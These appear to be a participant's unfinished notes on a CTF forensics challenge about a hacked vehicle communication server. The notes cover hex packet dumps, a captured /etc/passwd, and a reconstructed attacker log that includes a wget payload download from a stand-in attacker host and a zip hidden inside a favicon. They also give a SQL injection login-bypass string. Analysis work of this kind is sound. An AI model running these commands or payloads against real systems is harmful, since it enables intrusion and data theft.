# Mission Briefing
Opérateur 10 à Cyberphantom. Prenez message :

Nous avons perdu la communication avec un véhicule alors que nous sommes en pleine opération.
Nous avons une suspicion de hacking. J'ai besoin de votre diagnostic afin de rétablir la communication avec le véhicule dans les plus brefs délais.

Vous trouverez ici les derniers logs de communication entre la station radio et le véhicule. Ces informations devraient vous être utiles.

Terminé.

# Info get
3 IPs
10.10.0.2
10.10.0.254
163.172.68.42 => hypotetic server ip

## Details and Findings
We see that a lot of command is used on the Tserv
We can see that someone write a hash on the /tmp/secret file 
```bash
0000   00 04 00 01 00 06 02 42 0a 0a 00 fe 00 00 08 00   .......B........
0010   45 00 00 84 ec c4 40 00 40 06 5a d1 0a 0a 00 fe   E.....@.@.Z.....
0020   a3 ac 44 2a 9a 30 00 17 80 60 6c 5a 89 9a 4f 57   ..D*.0...`lZ..OW
0030   80 18 01 e9 f3 54 00 00 01 01 08 0a b3 12 b6 84   .....T..........
0040   b3 39 10 33 65 63 68 6f 20 55 6b 31 37 4e 32 46   .9.3echo Uk17N2F
0050   6d 5a 6a 4a 68 4e 6a 41 33 59 6a 45 7a 5a 6a 63   mZjJhNjA3YjEzZjc
0060   7a 59 32 49 77 4f 54 4d 32 5a 6a 6b 32 5a 54 59   zY2IwOTM2Zjk2ZTY
0070   33 59 6a 49 78 4d 44 49 77 4e 32 46 6c 4d 44 51   3YjIxMDIwN2FlMDQ
0080   33 4e 58 30 4b 20 3e 20 2f 74 6d 70 2f 73 65 63   3NX0K > /tmp/sec
0090   72 65 74 0a                                       ret.
```

`Uk17N2FmZjJhNjA3YjEzZjczY2IwOTM2Zjk2ZTY3YjIxMDIwN2FlMDQ3NX0K` = `efa3fb1f409aa622dddd7220ad6567580fb68b68`

```bash
0000   00 04 00 01 00 06 02 42 0a 0a 00 fe 00 00 08 00   .......B........
0010   45 00 00 4f ec ab 40 00 40 06 5b 1f 0a 0a 00 fe   E..O..@.@.[.....
0020   a3 ac 44 2a 9a 30 00 17 80 60 6b f2 89 9a 46 b7   ..D*.0...`k...F.
0030   80 18 01 f6 f3 1f 00 00 01 01 08 0a b3 12 41 b3   ..............A.
0040   b3 38 a9 8d 76 6c 52 30 49 51 77 4a 4c 36 30 52   .8..vlR0IQwJL60R
0050   47 51 76 41 38 6e 65 32 6d 6f 70 58 5a 6b 0a      GQvA8ne2mopXZk.
```

`vlR0IQwJL60RGQvA8ne2mopXZk` = ?

```bash
0000   00 00 00 01 00 06 02 42 37 94 7b 6e 00 00 08 00   .......B7.{n....
0010   45 00 00 6c 76 8e 00 00 34 06 1d 20 a3 ac 44 2a   E..lv...4.. ..D*
0020   0a 0a 00 fe 00 17 9a 30 89 9a 4f 57 80 60 6c aa   .......0..OW.`l.
0030   80 18 01 fe 8a 70 00 00 01 01 08 0a b3 39 1e 94   .....p.......9..
0040   b3 12 b6 84 0d 00 3c 7a 59 32 49 77 4f 54 4d 32   ......<zY2IwOTM2
0050   5a 6a 6b 32 5a 54 59 33 59 6a 49 78 4d 44 49 77   Zjk2ZTY3YjIxMDIw
0060   4e 32 46 6c 4d 44 51 33 4e 58 30 4b 20 3e 20 2f   N2FlMDQ3NX0K > /
0070   74 6d 70 2f 73 65 63 72 65 74 0d 0a               tmp/secret..
```

`<zY2IwOTM2Zjk2ZTY3YjIxMDIwN2FlMDQ3NX0K` = ?

```bash
0000   00 00 00 01 00 06 02 42 37 94 7b 6e 00 02 08 00   .......B7.{n....
0010   45 00 04 4a 76 93 00 00 34 06 19 3d a3 ac 44 2a   E..Jv...4..=..D*
0020   0a 0a 00 fe 00 17 9a 30 89 9a 4f eb 80 60 6c da   .......0..O..`l.
0030   80 18 01 fe 9d 85 00 00 01 01 08 0a b3 39 35 81   .............95.
0040   b3 12 cd 84 72 6f 6f 74 3a 78 3a 30 3a 30 3a 72   ....root:x:0:0:r
0050   6f 6f 74 3a 2f 72 6f 6f 74 3a 2f 62 69 6e 2f 62   oot:/root:/bin/b
0060   61 73 68 0d 0a 64 61 65 6d 6f 6e 3a 78 3a 31 3a   ash..daemon:x:1:
0070   31 3a 64 61 65 6d 6f 6e 3a 2f 75 73 72 2f 73 62   1:daemon:/usr/sb
0080   69 6e 3a 2f 75 73 72 2f 73 62 69 6e 2f 6e 6f 6c   in:/usr/sbin/nol
0090   6f 67 69 6e 0d 0a 62 69 6e 3a 78 3a 32 3a 32 3a   ogin..bin:x:2:2:
00a0   62 69 6e 3a 2f 62 69 6e 3a 2f 75 73 72 2f 73 62   bin:/bin:/usr/sb
00b0   69 6e 2f 6e 6f 6c 6f 67 69 6e 0d 0a 73 79 73 3a   in/nologin..sys:
00c0   78 3a 33 3a 33 3a 73 79 73 3a 2f 64 65 76 3a 2f   x:3:3:sys:/dev:/
00d0   75 73 72 2f 73 62 69 6e 2f 6e 6f 6c 6f 67 69 6e   usr/sbin/nologin
00e0   0d 0a 73 79 6e 63 3a 78 3a 34 3a 36 35 35 33 34   ..sync:x:4:65534
00f0   3a 73 79 6e 63 3a 2f 62 69 6e 3a 2f 62 69 6e 2f   :sync:/bin:/bin/
0100   73 79 6e 63 0d 0a 67 61 6d 65 73 3a 78 3a 35 3a   sync..games:x:5:
0110   36 30 3a 67 61 6d 65 73 3a 2f 75 73 72 2f 67 61   60:games:/usr/ga
0120   6d 65 73 3a 2f 75 73 72 2f 73 62 69 6e 2f 6e 6f   mes:/usr/sbin/no
0130   6c 6f 67 69 6e 0d 0a 6d 61 6e 3a 78 3a 36 3a 31   login..man:x:6:1
0140   32 3a 6d 61 6e 3a 2f 76 61 72 2f 63 61 63 68 65   2:man:/var/cache
0150   2f 6d 61 6e 3a 2f 75 73 72 2f 73 62 69 6e 2f 6e   /man:/usr/sbin/n
0160   6f 6c 6f 67 69 6e 0d 0a 6c 70 3a 78 3a 37 3a 37   ologin..lp:x:7:7
0170   3a 6c 70 3a 2f 76 61 72 2f 73 70 6f 6f 6c 2f 6c   :lp:/var/spool/l
0180   70 64 3a 2f 75 73 72 2f 73 62 69 6e 2f 6e 6f 6c   pd:/usr/sbin/nol
0190   6f 67 69 6e 0d 0a 6d 61 69 6c 3a 78 3a 38 3a 38   ogin..mail:x:8:8
01a0   3a 6d 61 69 6c 3a 2f 76 61 72 2f 6d 61 69 6c 3a   :mail:/var/mail:
01b0   2f 75 73 72 2f 73 62 69 6e 2f 6e 6f 6c 6f 67 69   /usr/sbin/nologi
01c0   6e 0d 0a 6e 65 77 73 3a 78 3a 39 3a 39 3a 6e 65   n..news:x:9:9:ne
01d0   77 73 3a 2f 76 61 72 2f 73 70 6f 6f 6c 2f 6e 65   ws:/var/spool/ne
01e0   77 73 3a 2f 75 73 72 2f 73 62 69 6e 2f 6e 6f 6c   ws:/usr/sbin/nol
01f0   6f 67 69 6e 0d 0a 75 75 63 70 3a 78 3a 31 30 3a   ogin..uucp:x:10:
0200   31 30 3a 75 75 63 70 3a 2f 76 61 72 2f 73 70 6f   10:uucp:/var/spo
0210   6f 6c 2f 75 75 63 70 3a 2f 75 73 72 2f 73 62 69   ol/uucp:/usr/sbi
0220   6e 2f 6e 6f 6c 6f 67 69 6e 0d 0a 70 72 6f 78 79   n/nologin..proxy
0230   3a 78 3a 31 33 3a 31 33 3a 70 72 6f 78 79 3a 2f   :x:13:13:proxy:/
0240   62 69 6e 3a 2f 75 73 72 2f 73 62 69 6e 2f 6e 6f   bin:/usr/sbin/no
0250   6c 6f 67 69 6e 0d 0a 77 77 77 2d 64 61 74 61 3a   login..www-data:
0260   78 3a 33 33 3a 33 33 3a 77 77 77 2d 64 61 74 61   x:33:33:www-data
0270   3a 2f 76 61 72 2f 77 77 77 3a 2f 75 73 72 2f 73   :/var/www:/usr/s
0280   62 69 6e 2f 6e 6f 6c 6f 67 69 6e 0d 0a 62 61 63   bin/nologin..bac
0290   6b 75 70 3a 78 3a 33 34 3a 33 34 3a 62 61 63 6b   kup:x:34:34:back
02a0   75 70 3a 2f 76 61 72 2f 62 61 63 6b 75 70 73 3a   up:/var/backups:
02b0   2f 75 73 72 2f 73 62 69 6e 2f 6e 6f 6c 6f 67 69   /usr/sbin/nologi
02c0   6e 0d 0a 6c 69 73 74 3a 78 3a 33 38 3a 33 38 3a   n..list:x:38:38:
02d0   4d 61 69 6c 69 6e 67 20 4c 69 73 74 20 4d 61 6e   Mailing List Man
02e0   61 67 65 72 3a 2f 76 61 72 2f 6c 69 73 74 3a 2f   ager:/var/list:/
02f0   75 73 72 2f 73 62 69 6e 2f 6e 6f 6c 6f 67 69 6e   usr/sbin/nologin
0300   0d 0a 69 72 63 3a 78 3a 33 39 3a 33 39 3a 69 72   ..irc:x:39:39:ir
0310   63 64 3a 2f 76 61 72 2f 72 75 6e 2f 69 72 63 64   cd:/var/run/ircd
0320   3a 2f 75 73 72 2f 73 62 69 6e 2f 6e 6f 6c 6f 67   :/usr/sbin/nolog
0330   69 6e 0d 0a 67 6e 61 74 73 3a 78 3a 34 31 3a 34   in..gnats:x:41:4
0340   31 3a 47 6e 61 74 73 20 42 75 67 2d 52 65 70 6f   1:Gnats Bug-Repo
0350   72 74 69 6e 67 20 53 79 73 74 65 6d 20 28 61 64   rting System (ad
0360   6d 69 6e 29 3a 2f 76 61 72 2f 6c 69 62 2f 67 6e   min):/var/lib/gn
0370   61 74 73 3a 2f 75 73 72 2f 73 62 69 6e 2f 6e 6f   ats:/usr/sbin/no
0380   6c 6f 67 69 6e 0d 0a 6e 6f 62 6f 64 79 3a 78 3a   login..nobody:x:
0390   36 35 35 33 34 3a 36 35 35 33 34 3a 6e 6f 62 6f   65534:65534:nobo
03a0   64 79 3a 2f 6e 6f 6e 65 78 69 73 74 65 6e 74 3a   dy:/nonexistent:
03b0   2f 75 73 72 2f 73 62 69 6e 2f 6e 6f 6c 6f 67 69   /usr/sbin/nologi
03c0   6e 0d 0a 5f 61 70 74 3a 78 3a 31 30 30 3a 36 35   n.._apt:x:100:65
03d0   35 33 34 3a 3a 2f 6e 6f 6e 65 78 69 73 74 65 6e   534::/nonexisten
03e0   74 3a 2f 62 69 6e 2f 66 61 6c 73 65 0d 0a 73 79   t:/bin/false..sy
03f0   73 6c 6f 67 3a 78 3a 31 30 31 3a 31 30 32 3a 3a   slog:x:101:102::
0400   2f 68 6f 6d 65 2f 73 79 73 6c 6f 67 3a 2f 62 69   /home/syslog:/bi
0410   6e 2f 66 61 6c 73 65 0d 0a 74 65 6c 6e 65 74 64   n/false..telnetd
0420   3a 78 3a 31 30 32 3a 31 30 33 3a 3a 2f 6e 6f 6e   :x:102:103::/non
0430   65 78 69 73 74 65 6e 74 3a 2f 62 69 6e 2f 66 61   existent:/bin/fa
0440   6c 73 65 0d 0a 72 6f 6f 74 40 65 30 36 61 35 37   lse..root@e06a57
0450   38 35 66 65 32 34 3a 7e 23 20                     85fe24:~# 
```

- found webserv on port 5000 => http://163.172.68.42:5000/login
    The website login can easily be bypass with SQLi in the username input: `admin' -- OR 1=1` 
    Get the logs of the server of the vehicul 

- The hacker get a payload from a host (https://attacker.tld/m4lw3r3) that is been change on the /etc/hosts file before

0. before done anything the hacker hide this hash on the /tmp/.password file
```bash 
Aug 27 12:25:02 COMCYBER_SRV root[250822]: CMD(echo 'efa3fb1f409aa622dddd7220ad6567580fb68b68' > /tmp/.password) [0]
```

1. Change the hosts for target his host
```bash
Aug 27 12:30:03 COMCYBER_SRV root[250822]: CMD(vim /etc/hosts) [0]
```

2. Create a /hack dir on the /tmp/
```bash
Aug 27 12:33:45 COMCYBER_SRV root[250822]: CMD(mkdir hack) [0]
```

3. Download something from this hosts and put it on the /dev/null rep
```bash
Aug 27 12:33:45 COMCYBER_SRV root[250822]: CMD(wget -O /dev/null https://attacker.tld/m4lw3r3) [0]
```

4. Create a zip with the password from step 0 nammed secret.txt and put the message.txt and m4lw3r3 on it 
```bash
Aug 27 12:33:56 COMCYBER_SRV root[250822]: CMD(zip --password $(cat /tmp/.password) secret.zip message.txt m4lw3r3) [0]
```

5. The hacker put the content of the secret.zip into the favicon on the following url /app/static/assets/images/favicon.ico

```bash 
Aug 27 12:38:48 COMCYBER_SRV root[250822]: CMD(cat /app/static/assets/images/favicon.ico ./secret.zip > /app/static/assets/images/favicon.ico) [0]
```

# M4lw3r3 Analysis 

While reversing the malware i found this hex code with the instruction You should be able to decrypt this :
```bash
0x39c463428c629ce94df5bc1cb17bec86cb2231203a5270c59 8173f31415ff710696318d9e889e1c891728fed2ed14a291a5b3b76e217d6f3bf24bd484b71f08843b4f3cbb 30a5d480cf4e34339c5e06acc76574cfbea08a4fca2c73388b4e08831f8e037489092346809d7c164ab270a5 e04ae40a327c99590da89025ac48aa5
```
WHAT IS THIS ENCRYPTION ???
